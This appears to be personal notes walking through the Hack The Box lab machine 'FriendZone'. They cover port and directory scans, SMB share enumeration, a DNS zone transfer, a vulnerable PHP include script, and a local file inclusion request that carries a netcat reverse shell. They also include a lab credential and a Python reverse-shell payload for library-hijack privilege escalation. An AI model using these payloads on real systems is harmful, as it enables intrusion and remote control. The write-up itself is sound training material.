nmap
```
┌──(kali㉿kali)-[~/HTB/friendzone]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.240.89                                                 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 18:47 EST
Warning: 10.129.240.89 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.240.89
Host is up (0.045s latency).
Not shown: 64358 closed tcp ports (reset), 1170 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| tls-alpn: 
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m58s, deviation: 1h09m15s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2025-01-21T01:49:59+02:00
| smb2-time: 
|   date: 2025-01-20T23:49:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   47.33 ms 10.10.14.1
2   47.73 ms 10.129.240.89

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.80 seconds
```

```
┌──(kali㉿kali)-[~/HTB/friendzone]
└─$ dirsearch -u http://10.129.240.89/       
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/friendzone/reports/http_10.129.240.89/__25-01-20_18-48-02.txt

Target: http://10.129.240.89/

[18:48:02] Starting: 
[18:48:16] 403 -  302B  - /.htaccess.bak1                                   
[18:48:16] 403 -  299B  - /.ht_wsr.txt                                      
[18:48:16] 403 -  300B  - /.htaccessBAK
[18:48:16] 403 -  302B  - /.htaccess.save                                   
[18:48:16] 403 -  304B  - /.htaccess.sample
[18:48:16] 403 -  302B  - /.htaccess_orig
[18:48:16] 403 -  302B  - /.htaccess.orig                                   
[18:48:16] 403 -  301B  - /.htaccessOLD2
[18:48:16] 403 -  300B  - /.htaccess_sc
[18:48:16] 403 -  302B  - /.htpasswd_test                                   
[18:48:16] 403 -  303B  - /.htaccess_extra
[18:48:16] 403 -  293B  - /.html                                            
[18:48:16] 403 -  292B  - /.htm
[18:48:16] 403 -  298B  - /.htpasswds                                       
[18:48:16] 403 -  300B  - /.htaccessOLD
[18:48:16] 403 -  299B  - /.httr-oauth                                      
[18:48:20] 403 -  292B  - /.php                                             
[18:49:46] 200 -   11KB - /index.bak                                        
[18:50:35] 200 -   13B  - /robots.txt                                       
[18:50:39] 403 -  301B  - /server-status                                    
[18:50:39] 403 -  302B  - /server-status/                                   
[18:51:14] 200 -  408B  - /wordpress/                                       
                                                                             
Task Completed

                                                                                                                                         
┌──(kali㉿kali)-[~/HTB/friendzone]
└─$ sudo gedit /etc/hosts         
[sudo] password for kali: 

(gedit:25543): tepl-WARNING **: 19:05:49.196: Style scheme 'Kali-Dark' cannot be found, falling back to 'Kali-Dark' default style scheme.

(gedit:25543): tepl-WARNING **: 19:05:49.196: Default style scheme 'Kali-Dark' cannot be found, check your installation.
                                                                                                                                         
┌──(kali㉿kali)-[~/HTB/friendzone]
└─$ gobuster dir -u https://friendzone.red/ -w /home/kali/offsec/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://friendzone.red/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /home/kali/offsec/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 318] [--> https://friendzone.red/admin/]
/js                   (Status: 301) [Size: 315] [--> https://friendzone.red/js/]
/server-status        (Status: 403) [Size: 303]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
```

![Pasted image 20250121075123](<0. Attachments/Pasted image 20250121075123.png>)

![Pasted image 20250121080928](<0. Attachments/Pasted image 20250121080928.png>)

![Pasted image 20250121080241](<0. Attachments/Pasted image 20250121080241.png>)

![Pasted image 20250121080836](<0. Attachments/Pasted image 20250121080836.png>)

running an nse script
```
┌──(kali㉿kali)-[~/HTB/friendzone]
└─$ nmap --script smb-enum-shares.nse -p445 10.129.240.89
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 19:11 EST
Nmap scan report for friendzone.red (10.129.240.89)
Host is up (0.050s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.129.240.89\Development: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.129.240.89\Files: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files /etc/Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\hole
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.129.240.89\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.129.240.89\general: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\general
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.129.240.89\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
```

![Pasted image 20250121081405](<0. Attachments/Pasted image 20250121081405.png>)

![Pasted image 20250121081510](<0. Attachments/Pasted image 20250121081510.png>)
UWVRNlV3QnNvYjE3Mzc0MTg0OTdmd0JWY3ZIZTVS
![Pasted image 20250121081551](<0. Attachments/Pasted image 20250121081551.png>)

to get domains and subdomains
```
dig axfr friendzone.red @10.10.10.123
```
![Pasted image 20250121081740](<0. Attachments/Pasted image 20250121081740.png>)

![Pasted image 20250121082734](<0. Attachments/Pasted image 20250121082734.png>)

![Pasted image 20250121082843](<0. Attachments/Pasted image 20250121082843.png>)

![Pasted image 20250121082917](<0. Attachments/Pasted image 20250121082917.png>)

![Pasted image 20250121083048](<0. Attachments/Pasted image 20250121083048.png>)

![Pasted image 20250121090845](<0. Attachments/Pasted image 20250121090845.png>)
![Pasted image 20250121090900](<0. Attachments/Pasted image 20250121090900.png>)
```
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>
```
![Pasted image 20250121091140](<0. Attachments/Pasted image 20250121091140.png>)

LFI
![Pasted image 20250121091236](<0. Attachments/Pasted image 20250121091236.png>)

have a look later what this is
![Pasted image 20250121091500](<0. Attachments/Pasted image 20250121091500.png>)
```
https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/cmd&cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.3%204444%20%3E/tmp/f
```
![Pasted image 20250121091632](<0. Attachments/Pasted image 20250121091632.png>)

![Pasted image 20250121091831](<0. Attachments/Pasted image 20250121091831.png>)

![Pasted image 20250121091951](<0. Attachments/Pasted image 20250121091951.png>)

![Pasted image 20250121092058](<0. Attachments/Pasted image 20250121092058.png>)
friend --> Agpyu12!0.213$

priv esc
![Pasted image 20250121092402](<0. Attachments/Pasted image 20250121092402.png>)

![Pasted image 20250121092633](<0. Attachments/Pasted image 20250121092633.png>)

[Privilege Escalation via Python Library Hijacking | rastating.github.io](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

```
import pty
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.3",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```
![Pasted image 20250121100121](<0. Attachments/Pasted image 20250121100121.png>)

![Pasted image 20250121100432](<0. Attachments/Pasted image 20250121100432.png>)

